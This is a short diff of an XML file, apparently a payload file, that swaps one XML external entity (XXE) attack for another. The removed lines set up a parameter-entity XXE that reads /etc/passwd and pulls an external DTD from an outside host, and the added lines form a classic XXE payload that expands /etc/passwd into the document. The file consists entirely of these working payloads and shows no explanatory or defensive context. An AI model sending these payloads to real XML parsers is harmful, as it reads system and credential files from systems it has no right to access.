@@ -1,9 +1,6 @@
-<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE root [
- <!ENTITY % start "<![CDATA[">
- <!ENTITY % stuff SYSTEM "file:///etc/passwd">
-<!ENTITY % end "]]>">
-<!ENTITY % dtd SYSTEM "www.baidu.com">
-%dtd;
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "file:///etc/passwd">
 ]>
-<root>&all;</root>
+<r>&sp;</r>
